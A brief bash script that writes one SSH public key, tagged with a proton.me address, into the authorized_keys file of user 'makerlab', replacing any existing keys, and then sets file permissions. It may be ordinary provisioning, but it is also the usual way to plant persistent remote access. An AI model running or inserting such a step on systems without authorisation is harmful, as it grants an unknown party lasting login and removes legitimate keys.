#!/bin/bash
mkdir -p /home/makerlab/.ssh
echo "ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIB9wCncpVnSY1LVnunRpW5E6iJSuxYZOQhwFg+3era+2 whoveterinarianlearn@proton.me" > /home/makerlab/.ssh/authorized_keys
chmod 700 /home/makerlab/.ssh
chmod 600 /home/makerlab/.ssh/authorized_keys
